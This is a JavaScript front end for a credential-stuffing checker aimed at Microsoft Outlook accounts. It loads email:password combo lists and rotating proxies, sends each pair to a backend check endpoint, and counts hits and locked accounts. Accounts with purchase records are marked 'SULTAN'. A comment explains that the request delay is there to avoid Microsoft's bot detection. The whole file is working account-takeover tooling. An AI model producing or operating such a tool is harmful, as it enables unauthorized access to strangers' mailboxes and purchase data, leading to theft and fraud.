let isRunning = false;
let stats = { checked: 0, hit: 0, bad: 0, locked: 0, sultan: 0 };
let startTime;

const startBtn = document.getElementById('start-btn');
const stopBtn = document.getElementById('stop-btn');
const hitsTable = document.getElementById('res-table');

function updateStats() {
    document.getElementById('s-checked').innerText = stats.checked;
    document.getElementById('s-hit').innerText = stats.hit;
    document.getElementById('s-bad').innerText = stats.bad;
    document.getElementById('s-locked').innerText = stats.locked;
    
    // Update CPM (Checks Per Minute)
    if (isRunning) {
        const elapsedMinutes = (Date.now() - startTime) / 60000;
        const cpm = elapsedMinutes > 0 ? Math.floor(stats.checked / elapsedMinutes) : 0;
        document.getElementById('cpm-display').innerText = `CPM: ${cpm}`;
    }
}

function addTableRow(data) {
    const row = document.createElement('tr');
    
    // Logika Badge Status & Sultan
    let statusHtml = `<span class="badge-hit">HIT</span>`;
    let dataHtml = `<span style="color: #8b949e;">${data.count} Emails Found</span>`;
    
    if (data.isSultan) {
        statusHtml = `<span style="background: #ffcc00; color: #000; padding: 3px 8px; border-radius: 4px; font-weight: bold; font-size: 11px;">⭐ SULTAN</span>`;
        dataHtml = `<span style="color: #ffcc00; font-weight: bold;">[!] PURCHASE RECORD FOUND</span>`;
        stats.sultan++;
    } else if (data.status === 'LOCKED') {
        statusHtml = `<span style="background: #f39c12; color: #fff; padding: 3px 8px; border-radius: 4px; font-size: 11px;">LOCKED</span>`;
    }

    row.innerHTML = `
        <td style="color: #c9d1d9; font-family: monospace;">${data.combo.split(':')[0]}</td>
        <td>${statusHtml}</td>
        <td>${dataHtml}</td>
        <td><button class="btn-primary" style="padding:4px 10px; font-size:10px; border-radius:4px;" onclick="window.open('https://outlook.live.com')">OPEN MAIL</button></td>
    `;
    
    hitsTable.prepend(row);
}

async function startChecking() {
    const comboRaw = document.getElementById('inp-combos').value.split('\n').filter(c => c.includes(':'));
    const proxyRaw = document.getElementById('inp-proxies').value.split('\n').filter(p => p.trim() !== '');

    if (comboRaw.length === 0) return alert("Combo list is empty!");

    // Reset dan Start
    isRunning = true;
    startTime = Date.now();
    startBtn.disabled = true;
    stopBtn.disabled = false;
    
    for (let i = 0; i < comboRaw.length; i++) {
        if (!isRunning) break;

        const combo = comboRaw[i].trim();
        const proxy = proxyRaw.length > 0 ? proxyRaw[i % proxyRaw.length] : null;

        try {
            const response = await fetch('/api/check', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ combo, proxy })
            });

            const result = await response.json();

            stats.checked++;
            if (result.status === 'HIT') {
                stats.hit++;
                addTableRow(result);
            } else if (result.status === 'LOCKED') {
                stats.locked++;
                // Opsional: Tetap tampilkan di tabel jika ingin melihat yang terkunci
                // addTableRow(result); 
            } else {
                stats.bad++;
            }

            updateStats();
        } catch (error) {
            console.error("Worker Error:", error);
            stats.bad++;
            updateStats();
        }

        // Delay 300ms agar tidak memicu deteksi bot Microsoft terlalu cepat
        await new Promise(r => setTimeout(r, 300));
    }

    isRunning = false;
    startBtn.disabled = false;
    stopBtn.disabled = true;
    alert(`Checking Complete! Found ${stats.hit} Hits (${stats.sultan} Sultan)`);
}

startBtn.onclick = startChecking;
stopBtn.onclick = () => { isRunning = false; };
